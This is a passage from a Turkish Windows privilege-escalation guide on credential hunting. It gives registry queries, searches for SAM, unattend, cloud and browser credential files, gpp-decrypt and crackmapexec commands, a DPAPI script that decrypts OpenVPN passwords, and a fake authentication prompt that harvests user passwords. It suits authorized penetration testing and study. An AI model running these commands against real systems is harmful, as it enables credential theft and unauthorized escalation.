            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installer'lar **SYSTEM ayrıcalıklarıyla çalıştırılır**; birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarlarında parola ile ilgili değer adlarını saklar. Örneğin, [satıcının kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılmış olması ve söz konusu hesap için yetkilendirme gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına eklemeyin.

### Korunan sayfalara sahip paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa **dosya şifrelemesini**, çalışma sayfası korumasından veya gizli sütunlardan ayırt edin. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz, konuyla ilgili dosyaları inceleyin ve geniş kapsamlı envanter çıkarırken olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgisi bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dizininin uzaktan çalıştırma değişiklikleri için depolama alanı olduğunu belgeliyor; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya her ikisini kullanan bir betiğe yapılan kaldırılmış ya da eklenmiş referansları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı AES anahtarını ve şifrelenmiş dizgeyi gerektirir; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrı olarak sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını gözden geçirin, ardından sırları rutin envanter çıktısına yazdırmadan ilgili içeriği yetkiniz dahilinde inceleyin. Bir yama yolu, şifrelenmiş değer veya anahtar referansı tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve sırlara derleme değişikliklerinde yer vermekten kaçının.

### Özel yerel yönetici parolası rotasyonu

Elle geliştirilmiş bir parola rotasyon aracı, şifrelenmiş bir yerel yönetici parolasını yerel bir hizmette saklarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında tutabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte gözden geçirin. Yalnızca loopback üzerinde çalışan bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamasının başarılı olması, ilgili kayıtları okuma iznini kanıtlamaz. Şifreleme tohumu veya anahtar malzemesi şifreli verinin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce anahtar türetme yöntemini inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak belirleyici biçimde AES anahtarı türeten bir düzenek, bu parolayı korumak için uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik gerektiren durumlar için uygun olmadığını belgeliyor. Kurtarılan bir parolayı ayrıcalık yükseltme yolu olarak değerlendirmeden önce, güncel olduğunu ve yerel Administrators grubundaki bir hesaba ait olduğunu doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş veri bloğu tek başına bu koşulların hiçbirini kanıtlamaz. Parolaları ve anahtar malzemesini rutin envanter çıktısına eklemeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in dizin veya Entra tabanlı depolaması ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; benzer şekilde, [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağını belirler.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin envanter çıktısına eklemeyin. Bir eklenti yolu tek başına sır bulunduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin yapısı için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için de [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş biçimde saklanabilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgisinin yeniden kullanıldığını kanıtlar. Bu yol yalnızca bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına eklemeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış portlarını ve bağlandığı arayüzü gösterebilir. Openfire genellikle yönetici konsolunu loopback'e bağlar; dinleyici çalışıyorsa yerel bir hesap bu adrese yine de erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme politikasını ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasına neden olabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli inceleme yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adı verilen Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` değerini içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa bir API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı türde içerik barındırır; bir istemci yapılandırması bulmak, sunucu CA'sına erişim olduğunu göstermez. Bazı dağıtımlarda CA özel anahtarı çevrimdışı tutulur; bu nedenle okunabilir bir sunucu yapılandırması imzalama anahtarını içermeyebilir.

Bir Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyaların ACL'lerini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; farklıysa hizmetin yapılandırılmış yolunu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Özel anahtarı günlüklerde veya envanter çıktısında yazdırmaktan kaçının. Satıcının `config api_client` iş akışı bir istemci sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir ve bu rolü oluşturmak veya değiştirmek veri deposuna yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir erişim yolu sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkün olduğunda CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması yönergelerine](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir session manager'dır. Yerel şifrelenmiş veri deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir. Dışa aktarılan bir oturum yedeği `sessions-backup.dat` olarak adlandırılmış ve başka bir konumda saklanmış olabilir. [SolarWinds'in dışa aktarma kılavuzuna](https://thwack.solarwinds.com/discussion/comment/115591) göre dışa aktarımlar parola ile şifrelenir ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebilir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) ise yerel veri deposunun konumunu belirtir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını açığa çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Sunucu Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry'deki SSH anahtarları

SSH private key'leri `HKCU\Software\OpenSSH\Agent\Keys` registry anahtarında saklanabilir. Bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kayıtlı bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM ve SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Okunabilir Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'larını da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların açığa çıktığını kanıtlamaz ve yaygın `install.wim`, `boot.wim` ve kurtarma imajları çoğu zaman yanıltıcı sonuçlar verir. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı dosyayı arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesapları dağıtmayı sağlayan bir özellik vardı. Ancak bu yöntemin ciddi güvenlik açıkları bulunuyordu. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs), etki alanındaki tüm kullanıcılar tarafından erişilebilirdi. İkinci olarak, bu GPP’lerdeki parolalar, varsayılan anahtarı herkese açık olarak belgelenmiş AES256 ile şifrelenmişti ve kimliği doğrulanmış tüm kullanıcılar tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumuyla ilgili ayrıntıları içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot içindeki yedek arşivleri

Doğrudan yayınlanan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bu durumu bir veri ifşası olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adlarını ve boyutlarını listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya ele geçirilen bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteme

Kullanıcının bildiğini düşünüyorsanız, **kendi kimlik bilgilerini, hatta farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir zamanlar **parolaları** **açık metin** veya Base64 biçiminde içerdiği bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe uzantısı olmadan dosya adı listesi varyantı

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifreli kasa adayı olarak değerlendirin; dosyanın varlığı, dosyayı okuyabileceğinizi, kilidini açabileceğinizi veya depolanan kimlik bilgilerini kullanabileceğinizi kanıtlamaz. Bu dosyaların nerede depolandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifreli kasa için bir ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm key-file veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) yöntemini değerlendirmeden önce belirtilen hesabı ve NT hash değerinin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları vermez; uzaktan hizmet erişimi, hesap hakları ve ayrı bir hizmet yürütme adımı da sağlanmış olmalıdır. Envanter, veritabanını veya depolanan kimlik bilgilerini yazdırmak yerine kasa yolunu ve okunabilirliğini raporlamalıdır.

Önerilen tüm dosyalarda arama yapın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe uzantısı olmadan Search-command varyantı

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Kimlik bilgilerini aramak için Geri Dönüşüm Kutusu'nu da kontrol edin.

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adlarında açıkça kimlik bilgilerinden bahseden dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesinden kalmış ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise buna eşlik eden `$R` girdisinde saklar; arşivi açmadan önce meta verileri ve mevcut kimliğin okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle listenin boş olması kurtarılabilir bir yedeğin bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, incelemeye değer bir aday olarak değerlendirin.

Erişilebilir bir silinmiş `.pfx` dosyası, **code-signing** için de bir ipucu olabilir. İçerdiği özel anahtara erişilebiliyorsa bu anahtar, değiştirilmiş bir PowerShell script'ini imzalayabilir; [PowerShell, özel anahtar içeren bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası çalıştırma için mevcut kimliğin söz konusu script'i değiştirebilmesi, etkin bir kuralın script ve hedef hesap için oluşan imzayı kabul etmesi ve yüksek ayrıcalıklı bir scheduled task'ın ya da başka bir tüketicinin script'i gerçekten çalıştırması gerekir. `.pfx` dosya adı, sertifika konusu veya yazılabilir bir script tek başına bu zincirin mevcut olduğunu kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve scheduled command'ı inceleyin.

